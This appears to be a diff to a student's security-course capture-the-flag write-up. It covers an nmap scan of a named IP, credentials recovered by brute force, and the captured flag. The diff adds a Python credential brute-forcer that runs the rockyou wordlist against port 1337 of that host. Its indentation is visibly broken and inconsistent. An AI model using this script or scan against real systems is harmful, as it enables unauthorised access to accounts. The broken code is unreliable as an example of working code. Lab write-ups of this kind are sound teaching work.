@@ -39,3 +39,36 @@ I also found that 2222 was open and 1337 was open.
 ### Part 2 (55 pts)
 
   For this part of the assignment, I ran the command "nmap -p 1-65535 -sV -sS -T4 142.93.117.193" and tried to run all of the open ports which were 80,1337 and 2222 and the host 1337 worked to bring up the prompt "username:". I then wrote the code for the bruteforce program and ran it against the rockyou.txt file. I got the username as kruegster from his email on his website and then the password was pokemon. Once I had the server open I cd'd into home and then flight records and then I did the command "cat AAC27670" because it was on his Instagram. The flag is "CMSC389R-{c0rn3rstone-air-27670}".
+
+  import socket
+  import re
+  import sys
+
+  host = '142.93.117.193'
+  port = 1337
+  wordlist= "/Downloads/rockyou.txt"
+
+  def brute_force(username,pswd):
+
+      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      print "Trying "+username+": "+pswd
+      s.connect((host,port))
+      data = s.recv(1024)
+      	print(str(data))
+      s.send(username + '\n')
+      data = s.recv(1024)
+      	print(str(data))
+      s.send(pswd + '\n')
+      data = s.recv(1024)
+      	print(str(data))
+      s.close()
+      return str(data)
+  username = "kruegster"
+
+  with open("rockyou.txt") as f:
+      for pswd in f:
+              	result = brute_force(username, pswd)
+              	print(result)
+     	 if "Fail" not in result:
+     		 print "Password Found: "+pswd
+     		 sys.exit(0)
